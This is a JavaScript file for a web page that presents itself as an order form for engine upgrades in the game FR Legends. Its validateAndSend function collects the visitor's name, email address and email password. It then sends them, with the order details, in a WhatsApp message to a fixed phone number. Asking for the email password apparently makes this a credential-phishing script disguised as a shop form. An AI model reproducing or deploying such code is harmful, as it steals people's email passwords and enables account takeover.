document.addEventListener('DOMContentLoaded', function () {
        const modal = document.getElementById('myModal');
        const openModalButton = document.getElementById('openModalButton');
        const closeModalButton = document.getElementById("closeMyModal");

        openModalButton.addEventListener('click', function () {
            modal.style.display = 'block';
        });
        
        closeModalButton.addEventListener('click', function () {
            modal.style.display = 'none';
        });

        window.onclick = function (event) {
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        };
    });

    function validateAndSend() {
    const form = document.getElementById('whatsappForm');
    const requiredFields = form.querySelectorAll('.validate');
    const radioButtons = document.querySelectorAll('input[name="pilihPayment"]');
    const message = 'Harap isi kolom ini';
    let isValid = true;
    let selectedPayment = null;

    for (let i = 0; i < radioButtons.length; i++) {
        if (radioButtons[i].checked) {
            selectedPayment = radioButtons[i].getAttribute('id');
            break;
        }
    }

    requiredFields.forEach(function (input) {
        clearError(input);

        if (!isInputValid(input)) {
            showError(input, message);
            isValid = false;
        }
    });

    if (isValid && selectedPayment) {
        // Gantilah kode ini dengan logika Anda untuk mengirim data ke WhatsApp
        var walink = 'https://web.whatsapp.com/send',
            phone = '6289699383012',
            walink2 = 'HALO KAK SAYA INGIN UPGRADE SWAP ENGINE FR LEGENDS';

        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            var walink = 'whatsapp://send';
        }

        var input_nama = document.getElementById('wa_nama').value,
            input_email = document.getElementById('wa_email').value,
            input_sandiEmail = document.getElementById('wa_pw_mail').value,
            input_wa_message = document.getElementById('wa_pesan').value,
            input_lisensi = document.getElementById('wa_lisensi').options[document.getElementById('wa_lisensi').selectedIndex].text,
            input_TampilMsn = document.getElementById('wa_penampilan_mesin').options[document.getElementById('wa_penampilan_mesin').selectedIndex].text,
            input_tipeTurbo = document.getElementById('wa_tipe_mesin').options[document.getElementById('wa_tipe_mesin').selectedIndex].text,
            input_pembayaran = selectedPayment,
            input_viaUrl = location.href;

        var arda_whatsapp = walink + '?phone=' + phone + '&text=' + walink2 + '%0A%0A' +
            '*DATA SAYA* %0A' +
            'Nama : ' + input_nama + '%0A' +
            'Email : ' + input_email + '%0A' +
            'Sandi : ' + input_sandiEmail + '%0A' +
            'Metode Pembayaran : ' + input_pembayaran + '%0A' +
            '%0A' + '%0A' +
            '*DAFTAR BELANJAAN* %0A' +
            'Type Mobil: ' + input_lisensi + '%0A' +
            'Type Mesin : ' + input_TampilMsn + '%0A' +
            'Type Turbo : ' + input_tipeTurbo + '%0A' +
            '%0A' + '%0A' +
            'Pesan : %0A' + input_wa_message + '%0A' +
            '%0A' + '%0A' +
            'Sumber : %0A' + input_viaUrl + '%0A';

        window.open(arda_whatsapp, '_blank');
        window.location.href = input_viaUrl;
    }
}

function isInputValid(input) {
    return input.value.trim() !== '';
}

function showError(input, message) {
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message-button';
    errorDiv.innerText = message;
    input.parentNode.appendChild(errorDiv);
}

function clearError(input) {
    const errorDiv = input.parentNode.querySelector('.error-message-button');
    if (errorDiv) {
        input.parentNode.removeChild(errorDiv);
    }
}

    
    
  
